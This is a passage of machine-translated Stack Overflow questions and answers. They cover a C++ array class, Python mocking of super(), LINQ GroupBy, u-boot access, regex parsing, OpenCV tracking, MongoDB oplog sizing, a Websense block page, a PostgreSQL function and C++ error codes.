         size = (sze > 0 ? sze : 10);
         ptr = new int [ size ];
         for (int i = 0;  i < size; i++)
             ptr[ i ] = 0; //initial values
}
Array::Array (const Array & arr ): size(arr.size){
         ptr = new int [size];
         for ( int i = 0; i< size; i++)
             ptr [ i ] = arr.ptr [ i ];
}
Array::~Array(){
         delete [] ptr;
}
const Array &Array :: operator= ( const Array & right){//IMPO
         if(&right != this){ //edited self assignment test
                   if(size != right.size){//diff sized arrays
                           delete [] ptr; //reclaim space
                           size = right.size; 
                           ptr = new int [ size ]; //space created
                   }
         }
         for(int i=0; i<size; i++)
                 ptr[ i ] = right.ptr[ i ];
         return *this;     //enables cascading a=b=c       
}
bool Array::operator == ( const Array & right) const{
         if ( size != right.size )
            return false;
         for ( int i =0; i < size; i++ ){
             if ( ptr [ i ] != right.ptr[ i ] )
                return false;
         }
         return true;
 }
bool Array::operator != ( const Array & right ) const{ //edited
         return ! (*this == right);
}
const int Array::operator [] (int subscript) const{
         if(subscript >=0 && subscript < size)
            return ptr[ subscript ];      
}
int Array::getSize() const{ return size; }  
//friend functions not in .h
ostream & operator << ( ostream & output, const Array & array){
         for (int i = 0; i < array.size; i++)
             output << array.ptr[i] ; 
}
istream & operator >> ( istream & input, Array & array){
         for (int i = 0; i < array.size; i++)
             input >> array.ptr[i];
} 
```

现在 main.cpp

```
#include <cstdlib>
#include <iostream>
#include "array.h" // " " not <>
using namespace std;

int main(int argc, char *argv[])
{
Array a1(7),a2 (-1),a4; //changed a2
cout<<"Input "<<a1.getSize()<<" integers for Array object a1 and "<<a2.getSize()<<" integers for Array objecta2\n";
cin>>a1>>a2;
cout<<"a1 and a2 are\n";
cout<<a1<<endl<<a2;
cout<<"a1!=a2 : "<<(a1!=a2)<<endl;
cout<<"a1 ==a2: "<<(a1==a2)<<endl;
cout<<"Printing a1[5] : "<<a1[5]<<endl;
Array a3(a1); 
a4 = a3;

system("PAUSE");
return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T19:58:21.150

`ptr`您必须在构造函数中保留内存。

```
Array::Array (int size ){ //default constructor
         size = (size > 0 ? size : 10);
         ptr = new int [size]; // ADD THIS LINE
         for (int i = 0;  i < size; i++)
             ptr[ i ] = 0; //initial values
} 
```

您的代码还有一些其他问题不是崩溃的直接来源，但值得注意：

1.  `Array::operator !=`是根据自身来定义的。它应该类似于`operator==`，或者您可以重新使用它

    ```
    if( *this == right )
        return false;
    return true; 
    ```

2.  `Array::operator []`如果索引超出范围，应该可能会抛出异常。目前它只返回垃圾内存。

3.  在分配内部`Array::Array (int size )`分配`size`给参数，而不是分配给成员。将第一行更改为：

    ```
     this->size = (size > 0 ? size : 10); 
    ```

4.  `operator<<`并且`operator>>`应该分别返回`output`和`input`。

    ```
    ostream & operator << ( ostream & output, const Array & array){
       for (int i = 0; i < array.size; i++)
           output << array.ptr[i] ; 
       return output;
    } 
    ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:25:22.340

您的默认构造函数中有 2 个错误：

1）您没有为它分配内存`ptr`并尝试对其进行初始化，这肯定是一个错误并导致未定义的行为，因此如果您有一些无效值，`ptr`您可能会遇到分段错误或更糟的是您可能会覆盖一些您的值内部变量！

`size = (size > 0 ? size : 10);`( _ `size`_ `size`_ `size`_例如，`size`可能`7476327436`肯定远远超出了您的阵列的末尾。

除此之外，您的 , 中有 1 个错误`operator !=`，因为您有`if ( *this != right )`并且将`operator !=`用于比较，这在所有情况下都是一个递归函数，您将获得堆栈溢出异常，因此如果您想检查确切的指针，请使用`if ( this != right )`而不是那。

我第一次看到你的代码时并没有完全检查它，但是你的代码中有一些其他错误，我什至不知道你是如何编译它的，在多个地方你没有为你的函数提供返回值。请记住**永远不要忽略编译器警告**，以帮助您纠正您的编程错误：

```
const int Array::operator [] (int subscript) const{
    if(subscript >=0 && subscript < size)
        return ptr[ subscript ];
    // If not what should I do?? add a return value here, this is a warning
    // since compiler think somehow you know that your code never reach here
    // but do you really know??
    return 0;
}
ostream & operator << ( ostream & output, const Array & array){
    for (int i = 0; i < array.size; i++)
        output << array.ptr[i] ;
    // You say that your function return an ostream& but where is it??
    // this is an error so compiler have nothing to return instead of you!
    // And if your compiler does not generate an error possibly it return 
    // junk value that will cause an error!!
    return output;
}
istream & operator >> ( istream & input, Array & array){
    for (int i = 0; i < array.size; i++)
        input >> array.ptr[i];
    // again you forget to return an istream& and again this is an error
    return input;
} 
```

但除此之外，我在您的代码中没有看到任何错误，它应该可以正常运行

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T20:10:48.907

此外，您在执行`operator !=`at 行时遇到错误： `if ( *this != right )`- 递归定义，因此，堆栈溢出。

# python - 在 python 上模拟超类调用

> ID：13093526
> 
> 赞同：23
> 
> 时间：2012-10-26T19:53:44.493
> 
> 标签：python, unit-testing, mocking

我正在做一些单元测试，在某些时候我需要模拟一个`super`调用以引发错误，例如：

```
@classmethod
def myfunc(cls, *args, **kwargs)
    try:
        super(MyClass, cls).my_function(args, kwargs)
    except MyException as e:
        #... 
```

我正在使用[mocker](http://labix.org/mocker#head-83d80b643ee8544628ee7a8301a72443ac51a173)库来模拟我的对象，但我还没有找到一种方法来模拟它。

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2014-03-14T17:10:46.330

从标准库中使用[`unittest.mock`](https://docs.python.org/3.8/library/unittest.mock.html)我会做这样的事情。

在你的类定义中：

```
from somelib import ASuperClass

class MyClass(ASuperClass):
    def my_cool_method(self):
        return super().my_cool_method() 
```

在您调用的模块中`MyClass`：

```
from unittest.mock import patch
from mymodule import MyClass

@patch("mypackage.mymodule.ASuperClass.my_cool_method")
def call_with_mock(mocked_super):
    myinstance = MyClass()
    myinstance.my_cool_method()
    # do stuff with `mocked_super`

call_with_mock() 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-26T20:37:56.877

我找到了一种方法，有点老套，但它有效，我会用我的例子来解释，这是基于[这个](https://stackoverflow.com/questions/11194847/how-do-i-directly-mock-a-superclass-with-python-mock)响应，所以感谢@kindall：

```
def my_test(self):
    import __builtin__
    from mocker import Mocker, KWARGS, ARGS

    mymocker = mocker.mock()
    mymocker.my_function(ARGS, KWARGS)
    mocker.throw(MyException)

    def mysuper(*args, **kwargs):
        if args and issubclass(MyClass, args[0]):
            return mymocker
        return original_super(*args, **kwargs)

    __builtin__.original_super = super
    __builtin__.super = mysuper

    with mocker:
        MyClass.myfunc() 
```

所以本质上我所做的是检查`super`调用是否来自我想模拟的类，否则就做一个正常的`super`.

希望这可以帮助某人:)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-11-22T00:41:42.827

如果有人需要另一种方法来解决这个模拟：

```
# some_package/some_module.py

class MyClass(SuperClass):

    def some_function(self):
        result_super_call = super().function() 
```

```
# test_file.py

@patch('some_package.some_module.super')
def test_something(self, mock_super):
    obj = MyClass()
    mock_super().some_function.return_value = None 
```

使用 Python 3.6

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-03-29T20:32:38.400

@Markus 正在寻找正确的地方。只要您进行单元测试（即只有一次调用`super`），您就可以模拟`__builtin__.super`如下：

```
with mock.patch('__builtin__.super') as mock_super:
    mock_super.side_effect = TypeError
    with self.assertRaises(TypeError):
        obj.call_with_super() 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-03-03T02:33:04.657

Python 自己的 Mock 类[提供了一个可以帮助解决此问题的`spec`参数](https://docs.python.org/3/library/unittest.mock.html#autospeccing)：

```
with mock.patch('...ParentClass.myfunc') as mocked_fn:
    mocked_fn.side_effect = MyException()  # Parent's method will raise
    instance = mock.Mock(spec=MyClass)  # Enables using super()
    MyClass.myfunc(instance)  # Will enter your `except` block 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-26T20:11:37.933

好吧，那你需要mock`my_function`超类的方法`MyClass`来炸掉。

# c# - LINQ 分组错误：“不包含 'GroupBy' 的定义”

> ID：13093533
> 
> 赞同：2
> 
> 时间：2012-10-26T19:54:04.950
> 
> 标签：c#, linq

我有一个需要分组的列表。在列表中我添加了这个对象：

```
private class MyObject {

        private System.Drawing.Color color;
        private string title;            

        public MyObject(System.Drawing.Color color, string title)
        {
            this.color = color;
            this.title = title;
        }

        public string Title
        {
            get { return title; }
            set { title = value; }
        }

        public System.Drawing.Color Color
        {
            get { return color; }
            set { color = value; }
        }

} 
```

我将我的列表创建为：

```
System.Collections.Generic.List<MyObject> mList = new       System.Collections.Generic.List<MyObject >(); 
```

然后我尝试对内容进行分组：

```
var groupedList = mList.GroupBy(c => new {c.Title} ).ToList(); 
```

那就是我得到错误的时候。有任何想法吗？我怎样才能做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-26T19:58:36.213

这些类型的错误通常意味着您没有包括`System.Linq`在您的使用列表中。尝试将其放在代码文件的顶部：

`using System.Linq;`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-26T19:58:44.940

你有对 System.Linq 命名空间的引用吗？

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-26T19:59:36.473

您需要`using System.Linq`在名称空间的顶部或内部添加到文件中。

`GroupBy`实际上不是`List`类的方法，它是定义在`System.Linq`. 当您`using`向该命名空间添加语句时，它允许该命名空间中的所有扩展方法解析为它们为所在文件扩展的任何类型`using`。

一些不相​​关的注释：

1.  您可能还想在`using System.Collections.Generic`该文件的顶部添加一个 ，以及其他几个常见的命名空间，可能还有大多数其他命名空间。打字`System.Collections.Generic.List<MyObject> mList = new System.Collections.Generic.List<MyObject >();`只会让我畏缩。添加后，`using`您只需要：`List<MyObject> mList = new List<MyObjecT>();`.
2.  您可能不想为您的分组创建一个新的匿名类。它会起作用，但它会使使用结果更加烦人，而无需添加任何有用的东西。就这样做：`mList.GroupBy(c => c.Title )`如果您只想在`Title`.

# linux - 如何进入 uboot 命令提示符？

> ID：13093539
> 
> 赞同：13
> 
> 时间：2012-10-26T19:54:28.323
> 
> 标签：linux, u-boot

我有一个使用 UBOOT 引导到 Linux 的系统。当我通过串口连接到它时，我可以看到它正在启动。如何停止它引导 UBOOT 并获得 UBOOT 命令提示符？

在启动过程中，我可以在附加的串行终端上看到以下消息：

```
Security Framework initialized
Mount-cache hash table entries: 512
CPU: Testing write buffer coherency: ok
devtmpfs: initialized
TI81XX: Map 0xb3200000 to 0xfe500000 for dram barrier
TI81XX: Map 0x40300000 to 0xfe600000 for sram barrier
omap_voltage_early_init: voltage driver support not added
regulator: core version 0.5
regulator: dummy:
NET: Registered protocol family 16
omap_voltage_domain_lookup: Voltage driver init not yet happened.Faulting!
omap_voltage_add_dev: VDD specified does not exist!
OMAP GPIO hardware version 0.1
OMAP GPIO hardware version 0.1
OMAP GPIO hardware version 0.1
OMAP GPIO hardware version 0.1
Cannot clk_get ck_32
..... 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-27T11:25:01.067

**通常，u-boot 可以通过在启动期间在串行控制台上按 Escape 来中断。**

但是，这真的取决于 OEM 是如何配置 u-boot 的。另外，请记住，没有单一连贯的 u-boot 这样的东西——它至少有 40 个半官方的叉子，天知道有多少非官方的叉子。可以配置 u-boot 以使您不能真正中断启动过程，但这并不常见。

如果这不起作用，则可能是您的串行终端程序未配置为与 OEM 提供的相同设置 - 速度、奇偶校验、流量控制等。我建议尝试将终端程序串行速度从 115200 bps 更改（最常见）一直到 9600（不常见，但可能），并将流控制更改为 None、Xon/Xoff、CTS/RTS。如果没有任何效果，您可能需要使用另一条串行电缆 - 某些系统可能需要 NULL 调制解调器电缆。祝你好运！

# regex - 正则表达式很慢。试图提取多个字符串

> ID：13093547
> 
> 赞同：0
> 
> 时间：2012-10-26T19:54:41.950
> 
> 标签：regex

我对正则表达式相当陌生，并且使用 Notepad++ 进行了一些练习。我正在尝试从雅虎提取一些与股票相关的数据，但有些缺乏经验。也许有人可以帮我一把。将不胜感激。

我尝试解析的一个例子是：

```
<strong>230.00</strong></a></td><td class="yfnc_tabledata1"><a href="http://ca.finance.yahoo.com/q?s=AMZN121026C00230000">AMZN121026C00230000</a></td><td class="yfnc_tabledata1" align="right"><b>9.35</b></td><td class="yfnc_tabledata1" align="right"><span id="yfs_c10_amzn121026c00230000"><img style="margin-right:-2px;" src="op_files/up_g.gif" alt="Up" border="0" height="14" width="10"> <span class="yfi-price-change-green">0.35</span></span></td><td class="yfnc_tabledata1" align="right">9.25</td><td class="yfnc_tabledata1" align="right">9.40</td><td class="yfnc_tabledata1" align="right">3,857</td><td class="yfnc_tabledata1" align="right">1,041</td></tr><tr><td class="yfnc_tabledata1" nowrap="nowrap"> 
```

我基本上尝试提取数字 230.00、9.35、0.35、9.25、9.40、3857、1041。到目前为止我管理的是：

```
<strong>(\d.*?)</strong>.*?<b>(.*?)< 
```

但这真的很慢。到目前为止是正确的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:08:37.560

一个可能更快的变体可能是`(?<=>)(\d{1,3}(?:,\d{3})*+(?:\.\d+)?)(?=<)` 它只匹配 > 和 < 之间的数字，忽略其余的......

但请记住，就像 SomeKittens 所说：“一般来说，用正则表达式解析 HTML 是个坏主意……”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:11:06.857

[演示](http://regex101.com/r/aS7vD2)

你可以有这个例子，将匹配`tag`和它的数字，这样你就可以对它们做任何你想做的事情。您甚至可以按标签更改`[a-z]+`过滤`(span|b|td|whatever)`

# ios - Tracking object size using opencv on iPhone

> ID：13093548
> 
> 赞同：1
> 
> 时间：2012-10-26T19:54:46.963
> 
> 标签：ios, opencv

i am looking at developing an app for the iPhone that tracks a selected object, and monitors the size of a rectangle drawn around it.

I have seen the a demo that tracks a selected object - but was wondering if anyone can point me in the direction of examples where the size of an object (rectangle) is monitored?

Many thanks in advance,

Steve

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-25T18:53:15.697

I hadn't realised how long ago it was that I asked this question. For anybody looking for an answer to this - I have done the following:

1.  Convert the current frame to a grey scale image.
2.  Use a Haar Cascade Classifier to identify vehicles in the current frame.
3.  Draw a rectangle around the vehicle, and have a look to see if we have seen this car before (based on similar position)
4.  如果我们没有，当前汽车的大小和位置将被添加到可跟踪汽车列表中......
5.  如果有，则将矩形的当前尺寸添加到对象数组中
6.  矩形之间的大小差异计算为当前矩形高度的百分比 - 这应该是相当恒定和线性的。
7.  对这个百分比应用“校准常数”——这应该给出车辆的相对速度。

如果有人想要更详细的解释，请告诉我...

# mongodb - 我应该增加我的 MongoDB oplog 文件的大小吗？

> ID：13093550
> 
> 赞同：13
> 
> 时间：2012-10-26T19:54:52.780
> 
> 标签：mongodb

我知道 oplog 文件会将多个更新拆分为单个更新，但是批量插入呢？那些也分成单独的插入物吗？

如果我有一个写入密集型集合，大约每 30 秒插入约 20K 文档批次，我/我是否应该考虑将我的 oplog 大小增加到超出默认值？我有一个 3 成员副本集，mongod 在 64 位 Ubuntu 服务器上运行，Mongodb 数据位于 100GB 卷上。

以下是一些可能有用也可能没有帮助的数据：

```
 gs_rset:PRIMARY> db.getReplicationInfo()
    {
        "logSizeMB" : 4591.3134765625,
        "usedMB" : 3434.63,
        "timeDiff" : 68064,
        "timeDiffHours" : 18.91,
        "tFirst" : "Wed Oct 24 2012 22:35:10 GMT+0000 (UTC)",
        "tLast" : "Thu Oct 25 2012 17:29:34 GMT+0000 (UTC)",
        "now" : "Fri Oct 26 2012 19:42:19 GMT+0000 (UTC)"
    }
    gs_rset:PRIMARY> rs.status()
    {
        "set" : "gs_rset",
        "date" : ISODate("2012-10-26T19:44:00Z"),
        "myState" : 1,
        "members" : [
            {
                "_id" : 0,
                "name" : "xxxx:27017",
                "health" : 1,
                "state" : 1,
                "stateStr" : "PRIMARY",
                "uptime" : 77531,
                "optime" : Timestamp(1351186174000, 1470),
                "optimeDate" : ISODate("2012-10-25T17:29:34Z"),
                "self" : true
            },
            {
                "_id" : 1,
                "name" : "xxxx:27017",
                "health" : 1,
                "state" : 2,
                "stateStr" : "SECONDARY",
                "uptime" : 76112,
                "optime" : Timestamp(1351186174000, 1470),
                "optimeDate" : ISODate("2012-10-25T17:29:34Z"),
                "lastHeartbeat" : ISODate("2012-10-26T19:44:00Z"),
                "pingMs" : 1
            },
            {
                "_id" : 2,
                "name" : "xxxx:27017",
                "health" : 1,
                "state" : 2,
                "stateStr" : "SECONDARY",
                "uptime" : 61301,
                "optime" : Timestamp(1351186174000, 1470),
                "optimeDate" : ISODate("2012-10-25T17:29:34Z"),
                "lastHeartbeat" : ISODate("2012-10-26T19:43:59Z"),
                "pingMs" : 1
            }
        ],
        "ok" : 1
    }

gs_rset:PRIMARY> db.printCollectionStats()
dev_fbinsights
{
    "ns" : "dev_stats.dev_fbinsights",
    "count" : 6556181,
    "size" : 3117699832,
    "avgObjSize" : 475.53596095043747,
    "storageSize" : 3918532608,
    "numExtents" : 22,
    "nindexes" : 2,
    "lastExtentSize" : 1021419520,
    "paddingFactor" : 1,
    "systemFlags" : 0,
    "userFlags" : 0,
    "totalIndexSize" : 1150346848,
    "indexSizes" : {
        "_id_" : 212723168,
        "fbfanpage_id_1_date_1_data.id_1" : 937623680
    },
    "ok" : 1
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-10-27T00:00:36.330

当前主节点的 oplog 的大小越大，副本集成员能够保持离线而不会落后于主节点太远的时间窗口就越长。如果确实落后太多，则需要完全重新同步。

`timeDiffHours`返回的字段`db.getReplicationInfo()`报告 oplog 当前记录了多少小时的数据。在 oplog 填满并开始覆盖旧条目后，开始监视此值。尤其是在写负载很重的情况下（其中值会降低）。如果您假设它永远不会低于 N 小时，那么 N 是您可以容忍副本集成员暂时离线的最大小时数（例如，用于定期维护，或进行离线备份，或在硬件情况下失败）而不执行完全重新同步。然后，该成员将能够在重新联机后自动赶上主节点。

如果您对 N 有多低不满意，那么您应该增加 oplog 的大小。这完全取决于您的维护窗口时间长短，或者您或您的运营团队对灾难场景的响应速度。在为它分配多少磁盘空间时要自由，除非您对该空间有迫切的需求。

我在这里假设您在所有副本集成员上保持 oplog 的大小不变，这是合理的做法。如果不是，则计划具有最小 oplog 的副本集成员被选为主的场景。

（回答你的另一个问题：与多次更新类似，批量插入也被扇出到 oplog 中的多个操作中）

编辑：请注意，数据导入和批量插入/更新将数据写入 oplog 的速度明显快于您的应用程序在典型重负载下的速度。重申一下：在估计 oplog 填充需要多长时间时要保守。

# javascript - HTML、Javascript、.innerHTML、switch 和 case 中的引用问题

> ID：13093559
> 
> 赞同：0
> 
> 时间：2012-10-26T19:55:51.570
> 
> 标签：javascript, html

我正在修改 websense 块页面以包含一些基于变量的函数：$*WS_BLOCKREASON*$。我知道这个变量的潜在输出，我想要一个特定的函数。

问题是该页面甚至没有将默认情况传递给“<'div'>”内容。基本上我需要的内容是`<div id="helpDiv">`一整套文本，包括按钮。下面的脚本：

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Access to this site is blocked</title>
<link rel="stylesheet" href="/en/Custom/master.css" type="text/css">
<script type="text/javascript" language="javascript" src="/en/Default/master.js"></script>
<script type="text/javascript" language="javascript" src="/en/Default/base64.js"></script>
<script type="text/javascript" language="javascript" src="/en/Custom/security.js"></script>
<style type="text/css">
        .style1
        {
            width: 130px;
           height: 70px;
        }
    </style>
</head>
<body>

<!--[if lt IE 7]> <div style="width: 725px; height: 381px;"> <![endif] -->
        <img alt="BHI" class="style1" 
            src="/en/Custom/other.gif" /><br />
        <br />
        <br />
<div style="border: 1px solid #285EA6;width: 99.5%; max-width: 915px; overflow: hidden; margin-left: 1px; background-color: #EEF2F7;">
    <iframe src="$*WS_BLOCKMESSAGE_PAGE*$*WS_SESSIONID*$" title="BHI_BLOCK" 
        name="ws_block" frameborder="0" scrolling="no" 
        style="width:100%; height: 200px; margin-bottom: 0px;">
    </iframe>
<hr />
    <!-- onload=function() possible fix -->
    <script type="text/javascript">
    var blockReason=$*WS_BLOCKREASON*$;

    switch (blockReason)
        {
        case 'This Websense category is filtered: <b>Uncategorized</b>.':
            document.getElementById('helpDiv').innerHTML='<p style="margin-left: 10px">Help:&nbsp;&nbsp;&nbsp;&nbsp;<INPUT TYPE="button" VALUE="Submit UNCATEGORIZED website to Websense" onClick="parent.location=\'mailto:suggest@websense.com?subject=Uncategorized Website&body=Please review and correctly categorize the website that is listed below:%0A%0A' + $*WS_URL*$ + '%0A%0AThank you.\'"></p>\
            <hr />\
            <p style="margin-left: 64px">Clicking on the above button will open your mail client to send an e-mail to Websense for recategorization of the above site.</p>\
            <p style="margin-left: 64px">You will receive a confirmation e-mail and a case number from Websense indicating your request is proccessing.</p>\
            <p style="margin-left: 64px">Please note the response time for your request will vary. Allow to three to four (3-4) hours for updates to take effect once approved.</p>\
            <p style="margin-left: 64px">If you have any questions, please contact SOLV at <a href=tel:+18772222222>+1 877 2222222<a/> or <a href=http://solv:8093/CAisd/pdmweb.exe?OP=JUST_GRONK_IT+HTMPL=about.htmpl target="_blank">this link.</a></p>';
        break;

        case 'This Websense category is filtered: <b>Parked Domain</b>.':
            document.getElementById('helpDiv').innerHTML='<p>Parked domain</p>';
        break;

        default:
            document.getElementById('helpDiv').innerHTML='<p>No Block message help.</p>';
        }
    </script>
    <div frameborder="0" scrolling="no" style="width:100%; height: auto; margin-bottom: 0px;" id="helpDiv">
    </div>
<iframe src="$*WS_BLOCKOPTION_PAGE*$*WS_SESSIONID*$" name="ws_blockoption" 
        frameborder="0" scrolling="no" style="width:100%; height: auto;">
        <p>To enable further options, view this page with a browser that supports iframes</p>
    padding: 2px 0px;">
        <div style="clear: both; overflow: hidden; height:1px;"></div>
    </div>
</div>
<!--[if lt IE 7]> </div> <![endif]-->
<div id="light" class="white_content"></div>
<div id="fade" class="black_overlay"></div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:03:03.497

你在这条线上不正确地逃脱了：

```
 document.getElementById('helpDiv').innerHTML='<p style="margin-left: 10px">Help:&nbsp;&nbsp;&nbsp;&nbsp;<INPUT TYPE="button" VALUE="Submit UNCATEGORIZED website to Websense" onClick="parent.location="'\\"mailto:suggest@websense.com?subject=Uncategorized Website&body=Please review and correctly categorize the website that is listed below:%0A%0A$*WS_URL*$%0A%0AThank you."'\\"></p> 
```

它应该是（在 onClick 之后）：

```
"parent.location=\'mailto:suggest@websense.com?subject=Uncategorized Website&body=Please review and correctly categorize the website that is listed below:%0A%0A' + $*WS_URL*$ + '%0A%0AThank you.\'"></p>\ 
```

纠正了转义的小提琴：http: [//jsfiddle.net/3UxCc/](http://jsfiddle.net/3UxCc/) 它有效。

**编辑：**
看起来你的`$*WS`变量是标记。在这种情况下，您正在分配`blockReason`某些东西，但除非您的 WebSense 变量包含引号（顺便说一句，它不包含引号），否则您的分配看起来像：

```
var blockReason = other; 
```

由于它周围没有引号，因此它认为这`other`是一个变量而不是字符串文字。您需要将其括在引号中，例如：

```
var blockReason = '$*WS_BLOCKREASON*$'; 
```

这会将其建立为交换机能够使用的字符串文字。其他任何东西都是会引发错误的坏变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:05:35.287

试试这个。您正在进行一些不正确的转义...

特别是在案例的第一行中您的 onClick 部分

```
 case 'This Websense category is filtered: <b>Uncategorized</b>.':
    document.getElementById('helpDiv').innerHTML='<p style="margin-left: 10px">Help:&nbsp;&nbsp;&nbsp;&nbsp;<INPUT TYPE="button" VALUE="Submit UNCATEGORIZED website to Websense" onClick="parent.location=\'mailto:suggest@websense.com?subject=Uncategorized Website&body=Please review and correctly categorize the website that is listed below:%0A%0A' + $*WS_URL*$ + '%0A%0AThank you.\'"></p>\
    <hr />\
    <p style="margin-left: 64px">Clicking on the above button will open your mail client to send an e-mail to Websense for recategorization of the above site.</p>\
    <p style="margin-left: 64px">You will receive a confirmation e-mail and a case number from Websense indicating your request is proccessing.</p>\
    <p style="margin-left: 64px">Please note the response time for your request will vary. Allow to three to four (3-4) hours for updates to take effect once approved.</p>\
    <p style="margin-left: 64px">If you have any questions, please contact SOLV at <a href=tel:+18772097658>+1 877 209 7658<a/> or <a href=http://solv:8093/CAisd/pdmweb.exe?OP=JUST_GRONK_IT+HTMPL=about.htmpl target="_blank">this link.</a></p>';
break; 
```

**更新：**

刚刚在 jsFiddle 中玩过之后，我得出的结论是，您对 helpDiv 的引用是无效的。

如果您用一些警报替换所有这些，您的开关将达到默认值。它快死了，因为您的 getElementById 有问题。也许该元素没有 ID helpDiv？

这是一个真正精简的版本

[http://jsfiddle.net/5wvC3/](http://jsfiddle.net/5wvC3/)

这是另一个小提琴 - 并更新最后一个，表明代码大部分工作。你的 HTML 有问题

[http://jsfiddle.net/5wvC3/1/](http://jsfiddle.net/5wvC3/1/)

# postgresql - 在 SQL 控制台中运行 PostgreSQL 存储过程

> ID：13093575
> 
> 赞同：0
> 
> 时间：2012-10-26T19:57:04.957
> 
> 标签：postgresql

我有以下存储过程

```
CREATE FUNCTION runMortalityModel(a_user_id integer) RETURNS integer AS $$
DECLARE
    t1 RECORD;
    t2 RECORD;
    numberOfDeaths integer;
BEGIN
    SELECT person.id personId, person.age, condprobmin, condprobmax, random() experiment
    INTO t1
    FROM person, mortality_cond_prob 
    WHERE (user_id = a_user_id) and
    (person.age = mortality_cond_prob.age);

    SELECT personId
    INTO t2
    FROM t1
    WHERE (tmp.condprobmin <= experiment) and (experiment <= tmp.condprobmax);

    SELECT COUNT(*)
    INTO numberOfDeaths
    FROM t2;

    RAISE 'numberOfDeaths=%', numberOfDeaths;

    EXECUTE 
        'DELETE '
        || 'FROM person '
        || 'WHERE person.id IN ' 
        || t2;

    RETURN numberOfDeaths;
END
$$ LANGUAGE plpgsql; 
```

当我尝试使用运行此存储过程时

```
SELECT runMortalityModel(1); 
```

我得到错误`Relation »t1« doesn't exist`。

我该如何解决？

**更新 1**：将存储过程声明更改为

```
CREATE OR REPLACE FUNCTION runMortalityModel(a_user_id integer) RETURNS integer AS $$
DECLARE
    t1 RECORD;
    t2 RECORD;
    numberOfDeaths integer;
BEGIN
    EXECUTE 'SELECT person.id personId, person.age, condprobmin, condprobmax, random()  experiment '    
    || 'FROM person, mortality_cond_prob '
    || 'WHERE (user_id = ' || a_user_id || ') and '
    || '(person.age = mortality_cond_prob.age)'
    INTO t1;

    EXECUTE 'SELECT personId '
    || 'FROM ' || t1
    || ' WHERE (tmp.condprobmin <= experiment) and (experiment <= tmp.condprobmax)'
    INTO t2;

    EXECUTE 'SELECT COUNT(*) ' 
    || 'FROM ' || t2
    INTO numberOfDeaths;

    RAISE 'numberOfDeaths=%', numberOfDeaths;

    EXECUTE 
        'DELETE '
        || 'FROM person '
        || 'WHERE person.id IN ' 
        || t2;

    RETURN numberOfDeaths;
END
$$ LANGUAGE plpgsql; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T20:35:31.733

我看到原始代码有几个问题：

1.  您正在尝试使用`RECORD`变量作为关系，您应该这样做`... FROM (SELECT t1.*) s`；
2.  我认为没有必要选择 1 条记录，然后对该记录进行查询，然后执行`count(*)`，您将始终拥有`0`或`1`作为结果。

你的第二个版本看起来好多了，去吧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T20:32:49.483

这个似乎有效。如果你有更好的想法，请告诉他们。

```
CREATE FUNCTION runMortalityModel(a_user_id integer) RETURNS integer AS $$
DECLARE
    t1 RECORD;
    curRecord RECORD;
    numberOfDeaths integer;
BEGIN
    numberOfDeaths := 0;
    FOR curRecord IN 
        SELECT person.id personId, condprobmin, condprobmax, random() experiment 
        FROM person, mortality_cond_prob 
        WHERE (user_id = a_user_id) and 
        (person.age = mortality_cond_prob.age)
    LOOP
        IF (curRecord.condprobmin <= curRecord.experiment) AND     (curRecord.experiment <= curRecord.condprobmax) THEN
            EXECUTE 
                'DELETE '
                || 'FROM person '
                || 'WHERE person.id = ' || curRecord.personId;
            numberOfDeaths := numberOfDeaths + 1;

        END IF;
    END LOOP;

    RETURN numberOfDeaths;
END
$$ LANGUAGE plpgsql; 
```

# c++ - 将外部错误代码映射到 std::error_condition

> ID：13093576
> 
> 赞同：5
> 
> 时间：2012-10-26T19:57:08.913
> 
> 标签：c++, c++11, structured-exception

我正在考虑修改我们必须使用新的 C++11 [error_code/error_condition/exception mechanisim](http://blog.think-async.com/2010/04/system-error-support-in-c0x-part-1.html)的 MS 结构化异常到异常映射代码。

我的理解是，一般理念是您应该首先尝试将错误代码映射到 std::error_condition 代码，否则，请制作自己的自定义 error_condition 代码。

我看到的问题是[std::errc](http://en.cppreference.com/w/cpp/error/errc)非常适合处理 POSIX 错误。如果我从具有与典型操作系统调用完全不同的错误范围的源获取代码，则它的映射不正确。

例如，让我们以[Microsoft 的 SEH 代码](http://msdn.microsoft.com/en-us/library/windows/desktop/ms679356%28v=vs.85%29.aspx)为例。这些来自操作系统，因此理论上它应该映射以及 POSIX 之外的任何内容。但它肯定似乎根本无法很好地映射：

```
EXCEPTION_ACCESS_VIOLATION  = permission_denied
EXCEPTION_ARRAY_BOUNDS_EXCEEDED = argument_out_of_domain perhaps?
EXCEPTION_BREAKPOINT = ?
EXCEPTION_DATATYPE_MISALIGNMENT = ?
EXCEPTION_FLT_DENORMAL_OPERAND = ? 
EXCEPTION_FLT_DIVIDE_BY_ZERO = ?
EXCEPTION_FLT_INEXACT_RESULT = ? 
EXCEPTION_FLT_INVALID_OPERATION = ?
EXCEPTION_FLT_OVERFLOW = ?
EXCEPTION_FLT_STACK_CHECK = ?
EXCEPTION_FLT_UNDERFLOW = ?
EXCEPTION_GUARD_PAGE = ?
